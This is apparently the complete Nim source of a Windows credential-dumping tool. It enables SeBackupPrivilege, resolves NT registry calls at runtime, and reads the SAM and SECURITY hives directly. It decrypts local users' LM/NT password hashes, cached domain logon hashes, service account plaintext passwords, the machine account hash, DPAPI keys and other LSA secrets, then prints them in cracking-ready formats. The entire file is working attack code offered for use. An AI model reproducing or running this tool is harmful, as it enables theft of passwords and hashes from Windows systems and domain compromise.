import Structs
import Crypto
import Utility
import winim
import std/strutils
import std/sequtils
import checksums/md5
import nimcrypto


type
    NtOpenKeyExType = proc(KeyHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, OpenOptions: ULONG):NTSTATUS {.stdcall.}
    NtQueryKeyType = proc(KeyHandle: HANDLE,KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID, Length: ULONG, ResultLength: PULONG):NTSTATUS {.stdcall.}
    RegQueryMultipleValuesWType = proc(hKey: HKEY, val_list: PVALENTW, num_vals: DWORD, lpValueBuf: LPWSTR, ldwTotsize: LPDWORD):LSTATUS {.stdcall.}
    NtEnumerateKeyType = proc (KeyHandle: HANDLE,Index: ULONG, KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID,Length: ULONG,ResultLength: PULONG): NTSTATUS {.stdcall.}
    NtEnumerateValueKeyType = proc (KeyHandle: HANDLE,Index: ULONG,KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS,KeyValueInformation:PVOID,Length:ULONG,ResultLength:PULONG): NTSTATUS {.stdcall.}
    NtCloseType = proc (KeyHandle: HANDLE): NTSTATUS {.stdcall.}
var 
    NtOpenKeyExProc:NtOpenKeyExType= nil
    RegQueryMultipleValuesWProc:RegQueryMultipleValuesWType = nil
    NtQueryKeyProc:NtQueryKeyType = nil
    NtEnumerateKeyProc:NtEnumerateKeyType = nil
    NtEnumerateValueKeyProc:NtEnumerateValueKeyType = nil
    NtCloseProc:NtCloseType = nil


proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
  var 
    keyUnicode:UNICODE_STRING
    objectAttributes:OBJECT_ATTRIBUTES 
    openOptions:ULONG
    ntStatus:NTSTATUS
    returnHandle:HANDLE
  RtlInitUnicodeString(addr(keyUnicode),keyString);
  InitializeObjectAttributes(addr(objectAttributes),addr(keyUnicode),OBJ_CASE_INSENSITIVE,0,nil)
  openOptions = REG_OPTION_BACKUP_RESTORE or REG_OPTION_OPEN_LINK
  ntStatus = NtOpenKeyExProc(addr returnHandle,KEY_READ,addr objectAttributes, openOptions)
  if(ntStatus != 0):
    echo "[-] Error on openning key for ",keyString," : ",GetLastError()
    quit(-1)
  return returnHandle

proc EnumerateValueNames(hKey:HANDLE):seq[string] = 
  var
    returnValue:seq[string] = @[]
    index: ULONG = 0
    resultLength: ULONG = 0
    buffer:seq[byte]
    status:NTSTATUS
    info:ptr KEY_VALUE_BASIC_INFORMATION_STRUCT
    namePtr:ptr WCHAR
    name:string
  while true:

    discard NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,nil,0,addr resultLength)

    if resultLength == 0:
      break

    buffer = newSeq[byte](resultLength)

    status = NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,addr buffer[0],resultLength,addr resultLength)

    if status != 0:
      break

    info = cast[ptr KEY_VALUE_BASIC_INFORMATION_STRUCT](addr buffer[0])

    namePtr = cast[ptr WCHAR](addr info.Name)

    name = $cast[WideCString](namePtr)

    if(cmpIgnoreCase(name,"NL$Control") != 0):
      returnValue.add(name)
    inc index
  return returnValue

proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE,valueString: string):seq[byte] = 
  var 
    values: array[1, VALENTW]
    buffer: seq[byte]
    slice: seq[byte]
    bufferSize: DWORD
    returnValue:LSTATUS
  
  values[0].ve_valuename = valueString.newWideCString()
  bufferSize = 0
  returnValue = RegQueryMultipleValuesW( keyHandle, addr values[0], 1, nil, addr bufferSize)
  
  if returnValue != ERROR_MORE_DATA or bufferSize == 0:
    echo "[-] Error on reading buffer size for ",valueString," : ",GetLastError()
    quit(-1)
    
  buffer = newSeq[byte](bufferSize)

  returnValue = RegQueryMultipleValuesW(keyHandle, addr values[0], 1, cast[LPWSTR](addr buffer[0]), addr bufferSize)
  
  if returnValue != 0:
      echo "[-] Error on getting value for ",valueString," : ",GetLastError()
      quit(-1)
  
  if values[0].ve_valuelen > 0:
    let offset = values[0].ve_valueptr.int - cast[int](addr buffer[0])
    if offset >= 0 and offset + values[0].ve_valuelen.int <= buffer.len:
      slice = buffer[offset ..< offset + values[0].ve_valuelen.int]
      return slice
  return @[]

proc DynamicallyLoadFunctions():bool =
  var 
    ntdllHandle:HMODULE
    advapi32Handle:HMODULE 
  ntdllHandle = LoadLibraryA("ntdll.dll")
  advapi32Handle = LoadLibraryA("advapi32.dll")
  let ntOpenKeyExAddr = GetProcAddress(ntdllHandle, "NtOpenKeyEx")
  if(ntOpenKeyExAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for NtOpenKeyEx"
    return false
  let regQueryMultipleValuesWAddr = GetProcAddress(advapi32Handle, "RegQueryMultipleValuesW")
  if(regQueryMultipleValuesWAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for RegQueryMultipleValuesW"
    return false
  let ntQueryKeyAddr = GetProcAddress(ntdllHandle, "NtQueryKey")
  if(ntQueryKeyAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for NtQueryKey"
    return false
  let ntEnumerateKeyAddr = GetProcAddress(ntdllHandle, "NtEnumerateKey")
  if(ntEnumerateKeyAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for NtEnumerateKey"
    return false
  let ntEnumerateValueKeyAddr = GetProcAddress(ntdllHandle, "NtEnumerateValueKey")
  if(ntEnumerateValueKeyAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for NtEnumerateValueKey"
    return false
  let ntCloseAddr = GetProcAddress(ntdllHandle, "NtClose")
  if(ntCloseAddr == cast[FARPROC](0)):
    echo "[-] Error on Dynamically Loading functions for NtClose"
    return false
  NtOpenKeyExProc = cast[NtOpenKeyExType](ntOpenKeyExAddr)
  RegQueryMultipleValuesWProc = cast[RegQueryMultipleValuesWType](regQueryMultipleValuesWAddr)
  NtQueryKeyProc = cast[NtQueryKeyType](ntQueryKeyAddr)
  NtEnumerateKeyProc = cast[NtEnumerateKeyType](ntEnumerateKeyAddr)
  NtEnumerateValueKeyProc = cast[NtEnumerateValueKeyType](ntEnumerateValueKeyAddr)
  NtCloseProc = cast[NtCloseType](ntCloseAddr)
  return true


proc SetPrivilege(lpszPrivilege: LPCSTR): bool =
  var
    tp: TOKEN_PRIVILEGES
    luid: LUID
    hToken: HANDLE

  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, addr hToken) == 0:
    echo "[-] Current Token error: ", GetLastError()
    return false

  if LookupPrivilegeValueA(nil, lpszPrivilege, addr luid) == 0:
    echo "[-] LookupPrivilegeValue error: ", GetLastError()
    return false

  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

  if AdjustTokenPrivileges(hToken, FALSE, addr tp, cast[DWORD](sizeof(tp)), nil, nil) == 0:
    echo "[-] AdjustTokenPrivileges error: ", GetLastError()
    return false

  if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
    echo "[-] The token does not have the specified privilege."
    return false

  return true

proc GetBootKey(): seq[byte] = 
  var 
    keyValue:string
    regHandle:HANDLE
    bufferSize:ULONG
    returnValue:NTSTATUS
    buffer:seq[byte]
    returnBuffer:seq[byte] = newSeq[byte](16)
    scrambledByteArray:seq[byte]
    keyClassInfoPtr:PKEY_NODE_INFORMATION
    pClass: ptr UncheckedArray[WCHAR]
    classCharLen: ULONG
    classStr:string = ""
  let permutationMatrix = [byte 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
  let keyLocations = ["JD", "Skew1", "GBG", "Data"]
  let mainRegLocation = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
  for keyLocation in keyLocations:
    keyValue = mainRegLocation & keyLocation
    regHandle = OpenRegistryWithNtOpenKeyEx(keyValue)
    bufferSize = 0
    returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, NULL, 0, addr bufferSize)
    if bufferSize == 0:
      echo "[-] Error on reading buffer size for ",keyValue," : ",GetLastError()
      quit(-1)
    buffer = newSeq[byte](bufferSize)
    returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, cast[PVOID](addr buffer[0]), bufferSize, addr bufferSize)
    discard NtCloseProc(regHandle)
    if returnValue != 0:
      echo "[-] Error on getting value for ",keyValue," : ",GetLastError()
      quit(-1)
    keyClassInfoPtr = cast[PKEY_NODE_INFORMATION](addr buffer[0])
    if keyClassInfoPtr.ClassLength > 0:
      pClass = cast[ptr UncheckedArray[WCHAR]]( cast[uint64](addr buffer[0]) + cast[uint64](keyClassInfoPtr.ClassOffset))
      classCharLen = keyClassInfoPtr.ClassLength div cast[ULONG](sizeof(WCHAR))
      for i in 0 ..< classCharLen.int:
        classStr.add(cast[char](pClass[i]))
  scrambledByteArray = hexStringToByteArray(classStr)
  for i in countup(0,15):
    returnBuffer[i] = scrambledByteArray[permutationMatrix[i]]
  return returnBuffer

proc GetSysKey(): seq[byte] = 
  var handleVal = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account")
  var returnByte = GetValueWithRegQueryMultipleValuesWType(handleVal,"F")
  discard NtCloseProc(handleVal)
  return returnByte



proc GetHashedBootKey(fVal:seq[byte],bootKey:seq[byte]):seq[byte] = 
  let domainData = fVal[104 ..< fVal.len]

  # old style hashed bootkey storage
  if domainData[0] == 0x01:
    let f70:seq[byte]  = fVal[112 ..< 112+16]
    var data:seq[byte] = @[]

    data.add(f70)
    data.add(cast[seq[byte]]("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"))
    data.add(bootKey)
    data.add(cast[seq[byte]]("0123456789012345678901234567890123456789\0"))
    var md5ContextVar:MD5Context
    var md5DigestVar:MD5Digest
    md5ContextVar.md5Init()
    md5ContextVar.md5Update(data)
    md5ContextVar.md5Final(md5DigestVar)
    let md5bytes = newSeq[byte](16)
    copyMem(addr md5bytes[0],addr md5DigestVar[0],16)
    let f80 = fVal[128 ..< 128+32]

    return RC4Encrypt(md5bytes, f80)

  # new version -- Win 2016 / Win 10 and above
  elif domainData[0] == 0x02:
    var dctx : CBC[aes128]
    var sk_Salt_AES   = domainData[16 ..< 16+16]
    var sk_Data_Length = (cast[ptr int32](addr domainData[12]))[]
    var sk_Data_AES   = domainData[32 ..< 32 + sk_Data_Length]

    var decText = newSeq[byte](sk_Data_Length)
    # Initialization of CBC[aes256] context with encryption key
    dctx.init(addr bootKey[0], addr sk_Salt_AES[0])
    # Decryption process
    dctx.decrypt(addr sk_Data_AES[0], addr decText[0],cast[uint](sk_Data_Length))
    # Clear context of CBC[aes256]
    dctx.clear()
    return decText
  else:
    echo "[-] Error parsing hashed bootkey"
    quit(-1)

proc DumpSecret(keyLocation:string,decryptedLsaKey:seq[byte]):seq[byte] = 
  var 
    hKey:HANDLE = OpenRegistryWithNtOpenKeyEx(keyLocation)
    value:seq[byte] = GetValueWithRegQueryMultipleValuesWType(hKey,"")
    tempKey:seq[byte]
    valueData:seq[byte]
    valueDataVal2:seq[byte]
    returnValue:seq[byte]
    dctx: ECB[aes256]


  valueData = value[28..<value.len]
  tempKey = ComputeSha256(decryptedLsaKey,valueData[0..<32])
  valueDataVal2 = valueData[32..<32+valueData.len-32]
  # Initialization of ECB[aes256] context with encryption key
  dctx.init(tempKey)
  returnValue = newSeq[byte](valueDataVal2.len)
  # Decryption process
  dctx.decrypt(valueDataVal2, returnValue)
  # Clear context of ECB[aes256]
  dctx.clear()
  discard NtCloseProc(hKey)
  return returnValue

proc GetServiceUsername(targetService: string): string =
  let scMgrHandle = OpenSCManager(NULL, NULL, 0xF003F);
  let svcHandle = OpenService(scMgrHandle, targetService, SERVICE_QUERY_CONFIG)
  
  if svcHandle != 0:
    var bytesNeeded: DWORD = 0
    # First call fails intentionally to get required buffer size
    discard QueryServiceConfig(svcHandle, nil, 0, addr bytesNeeded)
    
    let qscPtr = newSeq[byte](bytesNeeded)

    if QueryServiceConfig(svcHandle, cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0]),bytesNeeded, addr bytesNeeded):
      let serviceInfo = cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0])
      CloseServiceHandle(svcHandle)
      return $serviceInfo.lpServiceStartName
  CloseServiceHandle(svcHandle)
  return "unknownUser"

proc PrintLSASecret(keyName:string,secretBlob:LsaSecretBlob) =
  if(keyName.toUpper().startsWith("_SC_")):
    let userName = GetServiceUsername(keyName[4..<keyName.len])
    echo "[*] Plaintext User from " & keyName & "service: " & userName & ":" & $secretBlob.SecretString
  elif(keyName.toUpper().startsWith("$MACHINE.ACC")):
    let hKey:HANDLE = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters")
    let domainNameArr = GetValueWithRegQueryMultipleValuesWType(hKey,"Domain")
    var domainName = SeqToUnicode(domainNameArr).replace("\0", "")
    let computerNameArr = GetValueWithRegQueryMultipleValuesWType(hKey,"Hostname")
    var computerName = SeqToUnicode(computerNameArr).replace("\0", "")
    let computerAcctHash = Md4Hash2(secretBlob.Secret).mapIt(it.toHex(2)).join("-").replace("-","").toLower()
    discard NtCloseProc(hKey)
    echo "[*] Machine Account: " & domainName & "\\" & computerName & "$:aad3b435b51404eeaad3b435b51404ee:" & computerAcctHash
  elif(keyName.toUpper().startsWith("DPAPI")):
    let machineStr = secretBlob.Secret[4..<4+20].mapIt(it.toHex(2)).join("-")
    let userStr = secretBlob.Secret[24..<24+20].mapIt(it.toHex(2)).join("-")
    echo "[*] DPAPI Keys: dpapi_machinekey: " & machineStr.replace("-","").toLower() & " & dpapi_userkey: " & userStr.replace("-","").toLower()
  elif(keyName.toUpper().startsWith("NL$KM")):
    echo "[*] NL$KM: " & secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
  elif(keyName.toUpper().startsWith("ASPNET_WP_PASSWORD")):
    echo "[*] ASPNET: " & $secretBlob.SecretString
  else:
    echo "[*] Secret Type not supported: " & keyName & " - " & secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()

proc GetSecurityDump() = 
  var
    hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\PolEKList")
    fVal = GetValueWithRegQueryMultipleValuesWType(hKey,"")
    data = fVal[28..<fVal.len]
    dataVal = data[0..<32]
    bootKey = GetBootKey()
    tempKey = ComputeSha256(bootKey, dataVal)
    dataVal2 = data[32..<32+data.len - 32]
    decryptedLsaKey:seq[byte] = newSeq[byte](dataVal2.len) #Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();
    dctx: ECB[aes256]
    nlkmKey:seq[byte]
    currValName:string = ""
    index: ULONG = 0
    buf:seq[byte]
    status: NTSTATUS
    bufSize: ULONG
    pInfo:PKEY_BASIC_INFORMATION
    nameLen:ULONG
    name:string = ""
    pName: ptr UncheckedArray[WCHAR]
    cachedDomainLogonKeyNames:seq[string]
    cachedDomainLogonValue:seq[byte]
    cachedUser:NlRecord
    decryptedCBC:seq[byte]
    slice:seq[byte]
    hashedPW:seq[byte]
    username:string
    domain:string
    startIndex:int
    sliceUsername:seq[byte]
    sliceDomain:seq[byte]
    listOfLSASecrets:seq[string]
    secretBlob:LsaSecretBlob

  # Initialization of ECB[aes256] context with encryption key
  dctx.init(tempKey)
  # Decryption process
  dctx.decrypt(dataVal2, decryptedLsaKey)
  # Clear context of ECB[aes256]
  dctx.clear()
  decryptedLsaKey = decryptedLsaKey[68..<68+32]
  discard NtCloseProc(hKey)
  hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM")
  while true:
    bufSize = 0
    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,nil,0,addr bufSize)

    if status == STATUS_NO_MORE_ENTRIES:
      break

    buf = newSeq[byte](bufSize)

    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)

    if status == 0:
      pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
      nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
      pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)

      name = ""
      for i in 0 ..< nameLen.int:
        name.add(cast[char](pName[i]))

      if(name.contains("CurrVal")):
        currValName = name
        break
    inc index
  if(currValName == ""):
    echo "[-] NLKM Key not found"
    quit(-1)
  discard NtCloseProc(hKey)
  nlkmKey = DumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\"&currValName,decryptedLsaKey)
  hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Cache")
  cachedDomainLogonKeyNames=EnumerateValueNames(hKey)
  for domainKeyName in cachedDomainLogonKeyNames:
    cachedDomainLogonValue = GetValueWithRegQueryMultipleValuesWType(hKey,domainKeyName)
    if(not (cachedDomainLogonValue[0 ..< 16].allIt(it == 0))):
      cachedUser = InitNlRecord(cachedDomainLogonValue)
      slice = nlkmKey[16..<16+16]
      decryptedCBC = DecryptAES_CBC(cachedUser.EncryptedData,slice,cachedUser.Iv)
      hashedPW = decryptedCBC[0..<16]
      sliceUsername = decryptedCBC[72..<72+cachedUser.UserLength]
      startIndex = 72 + Pad(cachedUser.UserLength) + Pad(cachedUser.DomainNameLength)
      sliceDomain = decryptedCBC[startIndex..<startIndex+Pad(cachedUser.DnsDomainLength)]
      domain = SeqToUnicode(sliceDomain)
      username = SeqToUnicode(sliceUsername)
      domain = domain.replace("\0", "")
      echo "[*] Cached Credential: " & domain & "/" & username & ":$DCC2$10240#" & username & "#" & hashedPW.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
  discard NtCloseProc(hKey)
  hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets")
  index = 0
  while true:
    bufSize = 0
    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,nil,0,addr bufSize)

    if status == STATUS_NO_MORE_ENTRIES:
      break

    buf = newSeq[byte](bufSize)

    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)

    if status == 0:
      pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
      nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
      pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)

      name = ""
      for i in 0 ..< nameLen.int:
        name.add(cast[char](pName[i]))

      if(cmpIgnoreCase(name,"NL$Control") != 0):
        listOfLSASecrets.add(name)
    inc index
  discard NtCloseProc(hKey)
  for lsaSecretString in listOfLSASecrets:
    if(cmpIgnoreCase(lsaSecretString,"NL$KM") == 0):
      secretBlob = NewLsaSecretBlob(nlkmKey)
      if(secretBlob.Length > 0):
        PrintLSASecret(lsaSecretString,secretBlob)
    else:
      secretBlob = NewLsaSecretBlob(DumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\"&lsaSecretString&"\\CurrVal",decryptedLsaKey))
      if(secretBlob.Length > 0):
        PrintLSASecret(lsaSecretString,secretBlob)
  

proc GetSAMDump() = 
  var 
    index: ULONG = 0
    buf:seq[byte]
    status: NTSTATUS
    bufSize: ULONG
    pInfo:PKEY_BASIC_INFORMATION
    nameLen:ULONG
    name:string = ""
    pName: ptr UncheckedArray[WCHAR]
    hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users")
    listOfUserKeys:seq[string] = @[]
    vValueUser:seq[byte]
    userRIDByteArray:array[4,byte]
    userRIDUint:uint32
    offset:int
    length:int
    lmHashOffset:int
    lmHashLength:int
    ntHashOffset:int
    ntHashLength:int
    usernameWstring:wstring
    antpassword:seq[byte] = cast[seq[byte]]("NTPASSWORD\0")
    almpassword:seq[byte] = cast[seq[byte]]("LMPASSWORD\0")
    hashedBootKey:seq[byte] = GetHashedBootKey(GetSysKey(), GetBootKey())
    lmHash:string 
    ntHash:string
    lmKeyParts:seq[byte] 
    lmHashDecryptionKey:seq[byte] 
    md5ContextVar:MD5Context
    md5DigestVar:MD5Digest
    ntKeyParts:seq[byte]
    ntHashDecryptionKey:seq[byte]
    encryptedNtHash:seq[byte]
    obfuscatedNtHashTESTING:seq[byte]
    encryptedLmHash:seq[byte]
    obfuscatedLmHashTESTING:seq[byte]
    enc_LM_Hash:seq[byte]
    lmData:seq[byte]
    enc_NT_Hash:seq[byte]
    ntData:seq[byte]
    lmHashSalt:seq[byte]
    ntHashSalt:seq[byte]
    desEncryptedHash:seq[byte]
    slice:seq[byte] 
    ridStr:string
    hashes:string

  while true:
    bufSize = 0
    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,nil,0,addr bufSize)

    if status == STATUS_NO_MORE_ENTRIES:
      break

    buf = newSeq[byte](bufSize)

    status = NtEnumerateKeyProc(hKey,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)

    if status == 0:
      pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
      nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
      pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)

      name = ""
      for i in 0 ..< nameLen.int:
        name.add(cast[char](pName[i]))

      if(name.startsWith("00000")):
        listOfUserKeys.add(name)
    inc index
  discard NtCloseProc(hKey)
  for userKey in listOfUserKeys:
    lmHash = "aad3b435b51404eeaad3b435b51404ee";
    ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
    userRIDUint = parseHexInt(userKey).uint32
    copyMem(addr userRIDByteArray[0],cast[ptr byte](addr userRIDUint),4) 
    hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\" & userKey)
    vValueUser = GetValueWithRegQueryMultipleValuesWType(hKey,"V")
    discard NtCloseProc(hKey)
    offset = (cast[ptr int32](addr vValueUser[12]))[]
    offset+=204
    length = (cast[ptr int32](addr vValueUser[16]))[]
    lmHashOffset = (cast[ptr int32](addr vValueUser[156]))[]
    lmHashOffset+=204
    lmHashLength = (cast[ptr int32](addr vValueUser[160]))[]
    ntHashOffset = (cast[ptr int32](addr vValueUser[168]))[]
    ntHashOffset+=204
    ntHashLength = (cast[ptr int32](addr vValueUser[172]))[]
    usernameWstring = newWString(0)
    index = 0
    while index < length:
      usernameWstring.add(cast[WCHAR](vValueUser[index+offset]))
      index=index+2
    if(vValueUser[ntHashOffset + 2] == 0x01):
      # Old Style Hashing
      lmKeyParts = newSeq[byte](0)
      lmHashDecryptionKey = newSeq[byte](16)
      lmKeyParts.add(hashedBootKey[0..<16])
      lmKeyParts.add(userRIDByteArray)
      lmKeyParts.add(almpassword)
      md5ContextVar.md5Init()
      md5ContextVar.md5Update(lmKeyParts)
      md5ContextVar.md5Final(md5DigestVar)
      copyMem(addr lmHashDecryptionKey[0],addr md5DigestVar[0],16)
      ntKeyParts = newSeq[byte](0)
      ntHashDecryptionKey = newSeq[byte](16)
      ntKeyParts.add(hashedBootKey[0..<16])
      ntKeyParts.add(userRIDByteArray)
      ntKeyParts.add(antpassword)
      md5ContextVar.md5Init()
      md5ContextVar.md5Update(ntKeyParts)
      md5ContextVar.md5Final(md5DigestVar)
      copyMem(addr ntHashDecryptionKey[0],addr md5DigestVar[0],16)
      if(ntHashLength == 20):
        encryptedNtHash = vValueUser[ntHashOffset+4..<ntHashOffset+4+16]
        obfuscatedNtHashTESTING = RC4Encrypt(ntHashDecryptionKey,encryptedNtHash)
        ntHash = DecryptSingleHash(obfuscatedNtHashTESTING,userKey).replace("-", "");
      if(lmHashLength == 20):
        encryptedLmHash = vValueUser[lmHashOffset+4..<lmHashOffset+4+16]
        obfuscatedLmHashTESTING = RC4Encrypt(lmHashDecryptionKey,encryptedLmHash)
        lmHash = DecryptSingleHash(obfuscatedLmHashTESTING, userKey).replace("-", "");
    else:
      enc_LM_Hash = vValueUser[lmHashOffset..<lmHashOffset+lmHashLength]
      lmData = enc_LM_Hash[24..<enc_LM_Hash.len]
      if(lmData.len>0):
        slice = hashedBootKey[0..<16]
        lmHashSalt = enc_LM_Hash[8..<8+16]
        desEncryptedHash = DecryptAES_CBC(lmData,slice,lmHashSalt)
        lmHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "");
      enc_NT_Hash = vValueUser[ntHashOffset..<ntHashOffset+ntHashLength]
      ntData = enc_NT_Hash[24..<enc_NT_Hash.len]
      if(ntData.len>0):
        slice = hashedBootKey[0..<16]
        ntHashSalt = enc_NT_Hash[8..<8+16]
        desEncryptedHash = DecryptAES_CBC(ntData,slice,ntHashSalt)
        ntHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "");
    ridStr = $userRIDUint
    hashes = lmHash.toLower() & ":" & ntHash.toLower()
    echo "[*] Local User RID: " & ridStr & " - " & $usernameWstring & " - " & hashes

proc main() =
  PrintBanner()
  if(not DynamicallyLoadFunctions()):
    echo "[-] Cannot call required functions"
    quit(-1)
  if(not SetPrivilege("SeBackupPrivilege")):
    echo "[-] Cannot enable SeBackupPrivilege."
    quit(-1)  
  echo "[!] Trying to parse SAM Related Credentials (Local Users)"
  echo ""
  GetSAMDump()
  echo ""
  echo "[!] Trying to parse Security Related Credentials (Cached Domain Logon Info, Machine Account and LSA Secrets)"
  echo ""
  GetSecurityDump()
  
when isMainModule:
  main()